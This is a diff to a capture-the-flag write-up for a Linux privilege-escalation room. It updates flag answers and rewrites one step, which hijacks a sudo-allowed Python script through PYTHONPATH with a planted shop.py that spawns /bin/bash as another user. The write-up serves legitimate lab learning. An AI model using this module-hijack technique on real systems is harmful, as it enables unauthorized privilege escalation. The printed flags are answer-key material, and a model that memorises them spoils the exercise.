@@ -532,7 +532,7 @@ irb(main):002:0> exec '/bin/bash'
 ```
 
 <p>3.30. What is the mission30 flag?<br>
-<code>viktor{b52c60124c0f8f85fe647021122b3d9a}</code></p>
+<code>mission30{d25b4c9fac38411d2fcb4796171bda6e}</code></p>
 
 ```bash
 mission28@linuxagency:~$ su mission29
@@ -743,7 +743,7 @@ reza{2f1901644eda75306f3142d837b80d3e}
 ```
 
 <p>4.5. What is jordan's flag?<br>
-<code>______</code></p>
+<code>jordan{fcbc4b3c31c9b58289b3946978f9e3c3}</code></p>
 
 ```bash
 reza@linuxagency:~$ sudo -l
@@ -765,28 +765,29 @@ Sudoers entry:
     Options: setenv, !authenticate
     Commands:
 	/opt/scripts/Gun-Shop.py
-reza@linuxagency:/tmp/shop$ pwd                              
-/tmp/shop
-reza@linuxagency:/tmp/shop$ echo import os > SHOP.py
-reza@linuxagency:/tmp/shop$ echo 'os.system("/bin/bash")' >> SHOP.py
-reza@linuxagency:/tmp/shop$ cat SHOP.py
+reza@linuxagency:/tmp$ touch shop.py
+touch shop.py
+reza@linuxagency:/tmp$ echo "import os" > shop.py
+echo "import os" > shop.py
+reza@linuxagency:/tmp$ echo "os.system('/bin/bash')" >> shop.py
+echo "os.system('/bin/bash')" >> shop.py
+reza@linuxagency:/tmp$ cat shop.py
+cat shop.py
 import os
-os.system("/bin/bash")
-reza@linuxagency:/tmp/shop$ 
-
-
-
-reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
-sudo: unknown user: /opt/scripts/Gun-Shop.py
-sudo: error initializing audit plugin sudoers_audit
-reza@linuxagency:~$ sudo -u jordan /opt/scripts/Gun-Shop.py
-Traceback (most recent call last):
-  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
-    import shop
-ModuleNotFoundError: No module named 'shop'
-reza@linuxagency:~$ mkdir -p /tmp/shop
-reza@linuxagency:~$ echo 'import os;os.system("/bin/bash");'> /tmp/shop/shop.py 
+os.system('/bin/bash')
+reza@linuxagency:/tmp$ sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
+<-u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
+jordan@linuxagency:~$ ls
+ls
+examples.desktop  flag.txt
+jordan@linuxagency:~$ cat flag.txt
+cat flag.txt
+}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj
+jordan@linuxagency:~$ 
 ```
+
+![image](https://github.com/user-attachments/assets/545507d5-45f3-4463-80a7-112b18c9fe47)
+
 <br>
 <br>
 
